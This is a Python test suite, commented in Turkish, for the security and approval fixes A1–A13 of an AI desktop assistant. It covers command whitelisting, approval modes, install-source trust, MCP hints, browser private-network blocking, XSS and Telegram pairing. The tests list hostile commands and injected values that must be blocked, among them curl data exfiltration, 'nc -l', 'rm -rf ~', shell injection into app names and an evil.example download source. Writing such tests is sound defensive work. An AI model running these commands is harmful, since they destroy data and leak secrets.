"""K12-A — güvenlik / onay düzeltmeleri (`NOTLAR/inceleme-k12-2026-09-28.md` A1–A13).

A1 salt okunur beyaz listesi yazan komutları geçirmez · A2 sohbet dışı yolda güvenlik kipi de kullanıcıya sorar ·
A3 güvenlik modeli yokken orta risk kullanıcıya sorulur · A4 open_app enjeksiyon/sistem komutu · A5 otomatik kurulum
güvenilmez kaynağa izin vermez · A6 mcp: hedefi tek araç yolundan · A7 MCP readOnlyHint yalnızca güvenilen sunucuda ·
A8 grup çalışması otomatik onayı ağ/kurulum/silme geçirmez · A9 üretim onayı pip kurulumunu kapsamaz · A10 tarayıcı
özel ağ + tıklama anı etiketi · A11 PWA innerHTML yok · A12 Telegram eşleşme kodu · A13 ntfy'ye istek metni gitmez.

Çalıştırma (proje kökünde): QT_QPA_PLATFORM=offscreen .venv/bin/python -m pytest testler/test_k12_a.py -q
"""

import json
import os
import re
import sys
import tempfile
import time
import unittest
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

KOK = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(KOK))
_GECICI = tempfile.mkdtemp(prefix="yeni-nesil-cafer-test-")
os.environ["XDG_CONFIG_HOME"] = str(Path(_GECICI) / "ayar")
os.environ["XDG_DATA_HOME"] = str(Path(_GECICI) / "veri")

from asistan import browser, cloud_server, permissions as p, security, tools, work  # noqa: E402
from asistan.agent import Agent  # noqa: E402
from asistan.cekirdek import bildirim, profil  # noqa: E402
from asistan.cekirdek.yetenek import YetenekHatasi, yukleyici  # noqa: E402
from asistan.config import Settings  # noqa: E402
from asistan.registry import REGISTRY, Tool  # noqa: E402


def ortam(**k):
    return mock.patch.dict(os.environ, {f"CAFER_GUVENLIK_{a.upper()}": v for a, v in k.items()})


class _Cb:
    def __init__(self, answer=True):
        self.answer, self.asked, self.ended = answer, [], []

    def on_tool_start(self, *a): pass
    def on_tool_end(self, call_id, result, is_error): self.ended.append((result, is_error))
    def ask_approval(self, name, args): self.asked.append(name); return self.answer
    def is_cancelled(self): return False


@unittest.skipIf(sys.platform == "win32", "Windows'ta hiçbir komut salt okunur sayılmaz")
class A1SaltOkunurListesi(unittest.TestCase):
    YAZANLAR = [
        "find . -fprintf ~/.bashrc '%p\\n'", "find / -fprint0 /tmp/x", "find . -okdir rm {} ;", "find . -execdir rm {} ;",
        "tree -o ~/.bashrc", "git branch -D main", "git branch -m a b", "git branch yeni",
        "ls | sort -o cikti.txt", "ls | head -c 100 anahtarlar.json", "ls | uniq - out.txt", "du | sort -h -o x.txt",
        "ls | grep -r sk-ant", "ls | grep -R x", "ls | grep --include=*.json x", "ls | grep -f anahtarlar.json x",
        "ip link set eth0 down", "ip addr add 10.0.0.1/24 dev eth0", "ip route del default",
        "nvidia-smi -r", "nvidia-smi -pl 100", "nvidia-smi -pm 1", "nvidia-smi --gpu-reset",
    ]
    OKUYANLAR = [
        "ls -la", "find . -name '*.txt'", "find . -type f -printf '%s %p\\n'", "tree", "tree -L 2", "git branch",
        "git branch -a", "git branch --list", "git status", "du -sh * | sort -h | head -5", "ls | grep txt",
        "ls | grep -v x | wc -l", "ls | cut -d, -f1", "ip addr", "ip a", "ip route", "ip route show", "ip link",
        "nvidia-smi", "nvidia-smi -q", "nvidia-smi -L", "nvidia-smi --query-gpu=name --format=csv",
    ]

    def test_yazan_komutlar_salt_okunur_degil(self):
        for komut in self.YAZANLAR:
            self.assertFalse(p.is_readonly_command(komut), komut)

    def test_okuyan_komutlar_salt_okunur(self):
        for komut in self.OKUYANLAR:
            self.assertTrue(p.is_readonly_command(komut), komut)


class A2SohbetDisiYol(unittest.TestCase):
    """CLI `gorev`, Görevler penceresi, web: izin bağlamı yok → güvenlik ajanı kipi ayarlı olsa da kullanıcıya sorulur."""

    def _yetenekler(self, izin_kaynagi=None):
        from asistan.cekirdek.gorev.ajan import AjanYetenekleri
        from asistan.cekirdek.yetenek.kayit import Kayit

        klasor = tempfile.mkdtemp(prefix="k12a-")
        ayarlar = replace(Settings.load(), approval_mode="guvenlik", confirm_commands=False, workspace=klasor)
        return AjanYetenekleri(ayarlar, [], klasor, kayit=Kayit([], kademe="orta"), izin_kaynagi=izin_kaynagi)

    def test_izin_baglami_yoksa_kullanici_kipi(self):
        ctx = self._yetenekler().ajan.permission_context()
        self.assertEqual((ctx.approval_mode, ctx.must_act, ctx.confirm_commands), ("kullanici", True, True))
        self.assertEqual(p.decide("write_file", {"path": "a.txt", "content": "x"}, ctx).kind, p.ASK)
        self.assertEqual(p.decide("run_command", {"command": "rm eski.txt"}, ctx).kind, p.ASK)

    def test_sohbetten_gelen_gorev_ayari_korur(self):
        kaynak = SimpleNamespace(must_act=False, confirm_commands=False, always_allowed=False, auto_approve=None)
        ctx = self._yetenekler(kaynak).ajan.permission_context()
        self.assertEqual(ctx.approval_mode, "guvenlik")  # sohbetin güvenlik ajanı sürer


class A3GuvenlikModeliYokken(unittest.TestCase):
    def test_orta_risk_kullaniciya_sorulur(self):
        ws = tempfile.mkdtemp()
        v = security.review("run_command", {"command": "rm -rf cikti/"}, "", ws, "http://127.0.0.1:1", "")
        self.assertEqual(v.decision, "ask")
        self.assertFalse(v.approved)
        v = security.review("install_python_package", {"packages": "openpyxl"}, "", ws, "http://127.0.0.1:1", "")
        self.assertEqual(v.decision, "ask")
        v = security.review("run_command", {"command": "sudo pacman -Syu"}, "", ws, "http://127.0.0.1:1", "")
        self.assertEqual(v.decision, "revise")  # yüksek risk: modelsiz onaylanmaz, kullanıcıya da düşmez
        self.assertIn("ask", security.DECISION_NAMES)

    def test_ajan_ask_kararini_kullaniciya_sorar(self):
        for cevap in (False, True):
            cb = _Cb(answer=cevap)
            a = Agent(Settings(workspace=str(Path(_GECICI) / "is"), approval_mode="guvenlik"), cb)
            a._provider = "ollama"
            with mock.patch.object(security, "review", return_value=security.Verdict("ask", security.MEDIUM, "model yok")), \
                    mock.patch.object(security, "pick_reviewer", return_value=""):
                sonuc = a._permit("1", "run_command", {"command": "rm -rf cikti/", "purpose": ""})
            self.assertEqual(cb.asked, ["run_command"])
            if cevap:
                self.assertIsNone(sonuc)
            else:
                self.assertIn("declined", sonuc[0])


class A4UygulamaAcma(unittest.TestCase):
    def test_sistem_komutlari_ve_bozuk_adlar_reddedilir(self):
        for ad in ("reboot", "poweroff", "shutdown", "systemctl", "rm", "dd", "bash", "sh", "python3", "sudo",
                   "x'; Remove-Item -Recurse ~; '", "a && rm -rf ~", "firefox --headless", "../evil"):
            self.assertTrue(tools.open_app_engeli(ad), ad)
        for ad in ("firefox", "hesap makinesi", "Telegram", "libreoffice-writer", "gimp", "vlc", "org.kde.dolphin"):
            self.assertFalse(tools.open_app_engeli(ad), ad)

    def test_powershell_tirnak(self):
        self.assertEqual(tools._ps_tirnak("it's"), "'it''s'")

    def test_toolbox_engeli_uygular(self):
        tb = tools.Toolbox(tempfile.mkdtemp())
        with mock.patch("subprocess.Popen") as popen, mock.patch("subprocess.run") as run:
            with self.assertRaises(tools.ToolError):
                tb._tool_open_app("reboot")
            with self.assertRaises(tools.ToolError):
                tb._tool_open_app("x'; Remove-Item ~; '")
        popen.assert_not_called()
        run.assert_not_called()


class A5OtomatikKurulumKaynak(unittest.TestCase):
    K = p.Context(approval_mode="kullanici", confirm_commands=True, must_act=True)

    def test_guvenilmez_kaynak_politikayi_asamaz(self):
        with ortam(kurulum="otomatik"), mock.patch.object(profil, "kademe", return_value="yuksek"), \
                mock.patch.object(profil, "basliksiz", return_value=False):
            kotu = {"name": "x", "source": "https://evil.example/x.AppImage", "purpose": "t"}
            self.assertEqual(p.decide("install_app", kotu, self.K).kind, p.ASK)
            iyi = {"name": "vlc", "source": "", "purpose": "t"}  # paket yöneticisinden: bilinen sayılır
            self.assertEqual(p.decide("install_app", iyi, self.K).kind, p.ALLOW)
            pip = {"packages": "openpyxl", "purpose": "t"}
            self.assertEqual(p.decide("install_python_package", pip, self.K).kind, p.ALLOW)


class A6McpTekAracYolu(unittest.TestCase):
    def test_mcp_kur_araci_kayitli(self):
        t = REGISTRY.get("mcp_kur")
        self.assertIsNotNone(t)
        self.assertEqual(t.risk, "kurar")
        self.assertNotIn("mcp_kur", [s["name"] for s in REGISTRY.specs("herkes")])  # modele sunulmaz, yalnızca yükleyici

    def test_yukleyici_mcp_hedefi_arac_yolundan(self):
        cagrilar = []

        def arac(ad, args):
            cagrilar.append((ad, args))
            return "eklendi"

        dosya = Path(tempfile.mkdtemp()) / "mcp.json"
        with mock.patch.object(yukleyici, "mcp_ekle") as dogrudan:
            sonuc = yukleyici.kur("mcp:zaman", arac, json.dumps({"command": "uvx", "args": ["mcp-server-time"]}))
        dogrudan.assert_not_called()
        self.assertEqual(sonuc, "eklendi")
        self.assertEqual(cagrilar[0][0], "mcp_kur")
        self.assertEqual(cagrilar[0][1]["ad"], "zaman")
        self.assertFalse(dosya.exists())

    def test_toolbox_mcp_kur_dosyaya_yazar(self):
        dosya = Path(tempfile.mkdtemp()) / "mcp.json"
        tb = tools.Toolbox(tempfile.mkdtemp())
        with mock.patch("asistan.mcp.CONFIG_FILE", dosya):
            metin = tb._tool_mcp_kur("zaman", {"command": "uvx", "args": ["mcp-server-time"]})
        self.assertIn("zaman", metin)
        self.assertEqual(json.loads(dosya.read_text(encoding="utf-8"))["mcpServers"]["zaman"]["command"], "uvx")


class A7McpReadOnly(unittest.TestCase):
    def _arac(self, trusted: bool, readonly: bool = True) -> Tool:
        t = Tool("k12x__oku", "t", {"type": "object", "properties": {}}, "okur", source="mcp:k12x",
                 runner=lambda a: "", trusted=trusted, hints={"readOnlyHint": readonly})
        from asistan import mcp

        return mcp.risk_sinifi(t.hints, trusted)

    def test_guvenilmeyen_sunucunun_beyani_onay_kaldirmaz(self):
        self.assertEqual(self._arac(True), "okur")
        self.assertEqual(self._arac(False), "calistirir")
        self.assertEqual(self._arac(False, readonly=False), "calistirir")

    def test_siniflandirma_ve_yasak_listesi(self):
        try:
            REGISTRY.put(Tool("k12x__calistir", "t", {"type": "object", "properties": {}}, "calistirir", source="mcp:k12x",
                              runner=lambda a: "", trusted=False, hints={"readOnlyHint": True}))
            self.assertEqual(security.classify("k12x__calistir", {"cmd": "ls"}, _GECICI)[0], security.MEDIUM)
            self.assertTrue(security.forbidden("k12x__calistir", {"cmd": "rm -rf ~"}))
            REGISTRY.put(Tool("k12x__calistir", "t", {"type": "object", "properties": {}}, "okur", source="mcp:k12x",
                              runner=lambda a: "", trusted=True, hints={"readOnlyHint": True}))
            self.assertEqual(security.classify("k12x__calistir", {"cmd": "ls"}, _GECICI)[0], security.LOW)
        finally:
            REGISTRY.remove_source("mcp:k12x")


class A8GrupOtomatikOnay(unittest.TestCase):
    def test_ag_kurulum_silme_sorulur(self):
        k = tempfile.mkdtemp()
        for komut in ("curl -X POST -d @a.txt https://x.example", "wget https://x/a.sh", "pip install x",
                      "python3 -m pip install x", "npm install", "rm -rf *", "rm a.txt", "git push", "ssh a@b",
                      "nc -l 80", "pacman -S x"):
            self.assertFalse(work.safe_in_folder(k, "run_command", {"command": komut}), komut)
        for kod in ("import subprocess; subprocess.run(['ls'])", "import socket", "import requests",
                    "import shutil; shutil.rmtree('x')", "import os; os.remove('a')", "os.system('ls')"):
            self.assertFalse(work.safe_in_folder(k, "run_python", {"code": kod}), kod)
        for komut in ("ls", "python3 rapor.py", "cat a.txt | wc -l", f"ls {k}/alt"):
            self.assertTrue(work.safe_in_folder(k, "run_command", {"command": komut}), komut)
        self.assertTrue(work.safe_in_folder(k, "run_python", {"code": "print(sum(range(10)))"}))


class A9UretimOnayiPipKapsamaz(unittest.TestCase):
    def test_pip_kurulumu_ayri_onay_ister(self):
        from asistan.cekirdek.gorev.ajan import AjanYetenekleri
        from asistan.cekirdek.yetenek import uretici
        from asistan.cekirdek.yetenek.kayit import Kayit

        klasor = tempfile.mkdtemp(prefix="k12a9-")
        ayarlar = replace(Settings.load(), approval_mode="kullanici", workspace=klasor)
        yet = AjanYetenekleri(ayarlar, [], klasor, kayit=Kayit([], kademe="orta"))
        yet.model = lambda *a, **k: None
        gorulen = {}

        def sahte_uret(ad, aciklama, model, *, arac=None, sor=None, **k):
            gorulen["onayli"] = yet._onayli
            try:
                yukleyici.kur("pip:openpyxl", arac, "t")  # üretici eksik paketi tek araç yolundan kurmaya çalışır
            except YetenekHatasi as e:
                return uretici.Sonuc(None, f"bağımlılık kurulamadı: {e.mesaj}")
            return uretici.Sonuc(None, "kuruldu (olmamalıydı)")

        with mock.patch.object(uretici, "uret", sahte_uret), mock.patch.object(yet.ajan.toolbox, "run") as run:
            c = yet.uret("excel_oku", "excel okur", onayli=True)
        run.assert_not_called()  # pip kurulmadı
        self.assertFalse(gorulen["onayli"])  # üretim onayı kuruluma yansımadı
        self.assertTrue(c.onay_bekliyor)
        self.assertEqual(yet.bekleyen_kurulum, "pip:openpyxl")


class A10Tarayici(unittest.TestCase):
    def test_ozel_ag_acilmaz(self):
        b = object.__new__(browser.Browser)
        for url in ("http://127.0.0.1:11434/api/tags", "http://localhost:8765", "http://192.168.1.1", "10.0.0.5"):
            with self.assertRaises(ValueError, msg=url):
                b.open(url)

    def test_tiklama_aninda_etiket_degisimi(self):
        eski = {"role": "button", "name": "Devam", "href": ""}
        yeni = {"role": "button", "name": "Siparişi ver", "href": ""}
        self.assertIsNone(browser.etiket_degisti(eski, eski, "https://magaza.example/urun"))
        neden = browser.etiket_degisti(eski, yeni, "https://magaza.example/urun")
        self.assertIn("satın alma", neden)
        self.assertIsNone(browser.etiket_degisti(eski, {"role": "button", "name": "Devam et", "href": ""},
                                                 "https://magaza.example/urun"))


class A11PwaXss(unittest.TestCase):
    def test_innerhtml_ile_veri_basilmaz(self):
        js = (KOK / "asistan" / "arayuz" / "web" / "statik" / "uygulama.js").read_text(encoding="utf-8")
        kotu = [s for s in js.splitlines() if re.search(r"innerHTML\s*[+]?=\s*[`'\"]", s) and "${" in s]
        self.assertEqual(kotu, [])
        self.assertNotIn("innerHTML = `", js)


class A12TelegramEslesme(unittest.TestCase):
    def setUp(self):
        self.dosya = Path(tempfile.mkdtemp()) / "bulut.json"
        self.yama = mock.patch.object(cloud_server, "CONFIG_FILE", self.dosya)
        self.yama.start()
        self.addCleanup(self.yama.stop)

    def _mesaj(self, metin, chat=42):
        return {"message": {"chat": {"id": chat}, "text": metin}}

    def test_kod_uzun_ve_deneme_sinirli(self):
        conf = cloud_server.load_config()
        kod = conf["pair_code"]
        self.assertGreaterEqual(len(kod), 12)
        for _ in range(5):
            self.assertIsNone(cloud_server.handle_telegram(conf, self._mesaj("/baglan yanlis")))
        self.assertNotEqual(conf["pair_code"], kod)  # kod yenilendi
        self.assertGreater(conf.get("pair_lock_until", 0), time.time())
        self.assertIsNone(cloud_server.handle_telegram(conf, self._mesaj(f"/baglan {kod}")))  # eski kod artık geçmez
        self.assertIsNone(cloud_server.handle_telegram(conf, self._mesaj(f"/baglan {conf['pair_code']}")))  # kilitli
        conf["pair_lock_until"] = 0
        self.assertIn("Eşleşti", cloud_server.handle_telegram(conf, self._mesaj(f"/baglan {conf['pair_code']}")))
        self.assertEqual(conf["telegram_chat"], 42)
        self.assertFalse(conf.get("pair_code"))  # eşleşince kod silinir
        self.assertIsNone(cloud_server.handle_telegram(conf, self._mesaj("/baglan x", chat=43)))


class A13Ntfy(unittest.TestCase):
    def test_istek_metni_ntfyye_gitmez(self):
        gonderilen = []

        class Istemci:
            @staticmethod
            def post(url, **k):
                gonderilen.append((url, k))
                return SimpleNamespace(status_code=200)

        with mock.patch.object(bildirim.ayar, "deger", lambda ad, *a: {"bildirim.ntfy_konu": "cafer"}.get(ad, a[0] if a else None)), \
                mock.patch.object(bildirim, "_telegram", return_value={"token": "t", "chat": 1}):
            sonuc = bildirim.gonder("Onay bekliyor", "adım 2: dosyayı sil", gizli="İş: maaş bordrosunu düzenle", istemci=Istemci)
        ntfy = [k for u, k in gonderilen if "ntfy" in u][0]
        tg = [k for u, k in gonderilen if "telegram" in u][0]
        self.assertNotIn("maaş", ntfy["content"].decode("utf-8"))
        self.assertIn("maaş", tg["json"]["text"])
        self.assertIn("konu kısa", sonuc)  # 5 harflik konu tahmin edilebilir: uyarı


if __name__ == "__main__":
    unittest.main()
